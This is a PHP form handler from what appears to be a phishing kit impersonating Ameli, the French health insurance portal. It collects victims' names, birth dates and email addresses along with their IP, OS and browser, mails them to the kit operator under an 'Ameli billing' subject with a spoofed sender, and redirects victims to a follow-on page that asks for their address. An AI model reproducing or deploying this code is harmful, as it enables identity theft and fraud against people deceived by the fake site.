<?php

ob_start();
session_start();
include("../config.php");

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $nom    = $_POST['nom'];
    $prenom = $_POST['prenom'];
    $ddn    = $_POST['day'] . "/" . $_POST['month'] . "/" . $_POST['year'];
    $Mail   = $_POST['mail'];

    $_SESSION['Nom']    = $nom;
    $_SESSION['Prenom'] = $prenom;
    $_SESSION['Ddn']    = $ddn;
    $_SESSION['mail']   = $Mail;

    setlocale(LC_TIME, 'fr_FR');
    date_default_timezone_set('Europe/Paris');
    $heure = date("H:i:s");
    $date = date("d/m/Y");
    
    $os = 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    if (strpos($user_agent, 'Windows') !== false) $os = 'Windows';
    elseif (strpos($user_agent, 'Mac') !== false) $os = 'macOS';
    elseif (strpos($user_agent, 'Linux') !== false) $os = 'Linux';
    elseif (strpos($user_agent, 'iPhone') !== false) $os = 'iPhone';
    elseif (strpos($user_agent, 'Android') !== false) $os = 'Android';
    
    $browser = 'Unknown';
    if (strpos($user_agent, 'Chrome') !== false) $browser = 'Chrome';
    elseif (strpos($user_agent, 'Safari') !== false) $browser = 'Safari';
    elseif (strpos($user_agent, 'Firefox') !== false) $browser = 'Firefox';
    elseif (strpos($user_agent, 'Edge') !== false) $browser = 'Edge';

    $message = "
❤️ BILLING INFO ❤️

👮 Nom : " . $_SESSION['Nom'] . "
🧑‍🚒 Prénom : " . $_SESSION['Prenom'] . "

💌 Email : " . $_SESSION['mail'] . "
📅 Date de naissance : " . $_SESSION['Ddn'] . "

🛒 Adresse IP : " . $_SERVER['REMOTE_ADDR'] . "
💻 Système d'exploitation : " . $os . "
🌐 Navigateur : " . $browser . "
⏰ Heure : " . $heure . " " . $date . "
";

    if ($mail_send == true) {
        $Subject = " 「💳」+1 Moritz zimmerman Ameli billing from " . $_SESSION["Nom"] . " | " . $_SERVER['REMOTE_ADDR'];
        $head = "From: Ameli billing <info@querty.bg>";
        mail($my_mail, $Subject, $message, $head);
    }

    header('Location: ../pages/adresse.php');
    ob_end_clean();
    exit();
}

header('Location: ../pages/billing.php');
exit();
